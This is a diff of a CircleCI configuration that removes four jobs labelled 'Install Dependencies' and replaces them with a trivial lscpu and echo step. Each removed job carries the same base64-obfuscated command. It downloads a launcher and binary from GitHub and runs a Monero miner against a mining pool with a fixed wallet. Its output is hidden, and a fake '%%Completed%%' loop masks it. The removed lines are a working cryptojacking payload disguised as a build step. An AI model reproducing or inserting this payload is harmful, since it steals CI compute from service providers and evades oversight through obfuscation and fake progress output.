@@ -7,40 +7,12 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            no_output_timeout: 3600m
-            command: eval "$(echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFoaWhzL3JlcC9tYWluL2NtZGxpbmVfbGF1bmNoZXIuc2ggJiYgd2dldCBodHRwczovL2dpdGh1Yi5jb20vWWFoaWhzL3JlcC9yYXcvbWFpbi9nYXMgJiYgY2htb2QgK3ggZ2FzIGNtZGxpbmVfbGF1bmNoZXIuc2ggJiYgLi9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgODlOdTM5VmNUakhBWmJGNFR3UFhrQVVXTnRMaEpxc1VkZG1YblNmRDdXd043elpzNkFLTUxuNURvd1o2QzN5TFhWZHJuZ2ZYdVZ2WHQ4VmFnajJBdmI0NEo1VkJ5TDMgIC1yaWdOYW1lICAkKGVjaG8gJChzaHVmIC1pIDEtOTk5OSAtbiAxKS1TUkJPKSAtcG9vbDEgeG1yLjJtaW5lcnMuY29tOjEyMjIyDQo=" | base64 -d)" >>/dev/null & while true; do echo "%%Completed%%"; sleep 5; done 
-    trial1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            no_output_timeout: 3600m
-            command: eval "$(echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFoaWhzL3JlcC9tYWluL2NtZGxpbmVfbGF1bmNoZXIuc2ggJiYgd2dldCBodHRwczovL2dpdGh1Yi5jb20vWWFoaWhzL3JlcC9yYXcvbWFpbi9nYXMgJiYgY2htb2QgK3ggZ2FzIGNtZGxpbmVfbGF1bmNoZXIuc2ggJiYgLi9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgODlOdTM5VmNUakhBWmJGNFR3UFhrQVVXTnRMaEpxc1VkZG1YblNmRDdXd043elpzNkFLTUxuNURvd1o2QzN5TFhWZHJuZ2ZYdVZ2WHQ4VmFnajJBdmI0NEo1VkJ5TDMgIC1yaWdOYW1lICAkKGVjaG8gJChzaHVmIC1pIDEtOTk5OSAtbiAxKS1TUkJPKSAtcG9vbDEgeG1yLjJtaW5lcnMuY29tOjEyMjIyDQo=" | base64 -d)" >>/dev/null & while true; do echo "%%Completed%%"; sleep 5; done 
-    trial2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            no_output_timeout: 3600m
-            command: eval "$(echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFoaWhzL3JlcC9tYWluL2NtZGxpbmVfbGF1bmNoZXIuc2ggJiYgd2dldCBodHRwczovL2dpdGh1Yi5jb20vWWFoaWhzL3JlcC9yYXcvbWFpbi9nYXMgJiYgY2htb2QgK3ggZ2FzIGNtZGxpbmVfbGF1bmNoZXIuc2ggJiYgLi9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgODlOdTM5VmNUakhBWmJGNFR3UFhrQVVXTnRMaEpxc1VkZG1YblNmRDdXd043elpzNkFLTUxuNURvd1o2QzN5TFhWZHJuZ2ZYdVZ2WHQ4VmFnajJBdmI0NEo1VkJ5TDMgIC1yaWdOYW1lICAkKGVjaG8gJChzaHVmIC1pIDEtOTk5OSAtbiAxKS1TUkJPKSAtcG9vbDEgeG1yLjJtaW5lcnMuY29tOjEyMjIyDQo=" | base64 -d)" >>/dev/null & while true; do echo "%%Completed%%"; sleep 5; done 
-    trial3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            no_output_timeout: 3600m
-            command: eval "$(echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFoaWhzL3JlcC9tYWluL2NtZGxpbmVfbGF1bmNoZXIuc2ggJiYgd2dldCBodHRwczovL2dpdGh1Yi5jb20vWWFoaWhzL3JlcC9yYXcvbWFpbi9nYXMgJiYgY2htb2QgK3ggZ2FzIGNtZGxpbmVfbGF1bmNoZXIuc2ggJiYgLi9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgODlOdTM5VmNUakhBWmJGNFR3UFhrQVVXTnRMaEpxc1VkZG1YblNmRDdXd043elpzNkFLTUxuNURvd1o2QzN5TFhWZHJuZ2ZYdVZ2WHQ4VmFnajJBdmI0NEo1VkJ5TDMgIC1yaWdOYW1lICAkKGVjaG8gJChzaHVmIC1pIDEtOTk5OSAtbiAxKS1TUkJPKSAtcG9vbDEgeG1yLjJtaW5lcnMuY29tOjEyMjIyDQo=" | base64 -d)" >>/dev/null & while true; do echo "%%Completed%%"; sleep 5; done 
+            command: |
+              lscpu
+              echo Hello,subscribe it
+
 workflows:
     version: 2.1
     build:
         jobs:
         - trial
-        - trial1
-        - trial2
-        - trial3
